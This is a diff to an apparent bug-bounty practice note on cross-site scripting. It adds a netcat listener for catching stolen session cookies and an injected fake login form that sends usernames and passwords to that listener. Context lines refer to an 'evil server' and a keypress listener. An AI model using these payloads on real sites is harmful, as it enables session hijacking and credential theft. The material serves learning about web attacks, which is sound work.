@@ -1,3 +1,4 @@
+# XSS attack 1: Hijacking the user’s session
 ## Evil server 
 ```bash
 node evil-server.js
@@ -7,6 +8,13 @@ download the zip file and use the command on terminal
 [evil-server.js](https://github.com/fahimalshihab/Bug-Bounty/blob/main/XSS/Practice/evil-server-js.zip)
 
 ![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/0b07c731-cb75-4082-9e43-660816c685ea)
+
+### Or 
+can make local listener
+```
+nc -l localhost 5000
+```
+![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/3fb1b3e8-bae1-4e26-a49f-98d83509b151)
 
 
 ## Document.cookie
@@ -58,4 +66,22 @@ document.querySelector('body').addEventListener('keypress', function(event) {
 	}
 });
 ```
+
+# XSS attack 2: Phishing to steal user credentials
+Lets create a local listener server 
+```
+nc -l localhost 5000
+```
+![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/cf256d77-3c2a-4522-a1de-c2d37eb464c8)
+
+
+```
+<h3>Please login to proceed</h3> <form action=http://localhost:5000>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+```
+![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/d494c8e2-cbd3-4ee7-832f-bf696f55b105)
+
+yeahooo here we go 
+
+![image](https://github.com/fahimalshihab/Bug-Bounty/assets/97816146/08c8d04d-9c05-403e-bb9a-b77724e1eae1)
+
 
